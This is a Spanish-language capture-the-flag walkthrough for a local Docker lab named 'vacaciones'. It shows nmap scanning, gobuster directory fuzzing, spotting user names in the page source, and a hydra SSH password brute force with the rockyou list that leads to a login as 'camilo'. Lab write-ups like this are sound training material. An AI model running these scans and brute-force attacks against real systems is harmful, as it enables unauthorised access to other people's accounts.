
DESPLIEGUE

```
bash auto_deploy.sh vacaciones.tar
```

-------------------------------

PROCEDIMIENTO:

Tenemos la IP: 
```
172.17.0.2
```


------------------

RECONOCIMIENTO

```
nmap -p- -sS -sV -sC --min-rate 5000 -n -vvv -Pn 172.17.0.2
```

![[Pasted image 20240915040316.png]]

Tenemos el puerto 22 y el 80.

Como tenemos el 80 vamos a ver que tiene en la web.

La web no muestra nada. 

Vamos hacer fuzzing con gobuster
 
``` 
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

![[Pasted image 20240915040721.png]]

Vamos a porner el directorio `/javascript`

![[Pasted image 20240915040844.png]]

==PERO==

Si vamos a la página principal y miramos el código html 
![[Pasted image 20240915041426.png]]
Tenemos dos nombres.

Camilo y Juan

Pues ya que tenemos los dos usuario vamos a probar con hydra

```
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

![[Pasted image 20240915041931.png]]

Y sólo hace falta para entrar por el puerto ssh 

```
ssh camilo@172.17.0.2
```

Nos da error. Tenemos que poner lo siguiente:

```
ssh-keygen -R 172.17.0.2
```

Volvemos a probar.


![[Pasted image 20240915042410.png]]

Y ya estamos adentro. 
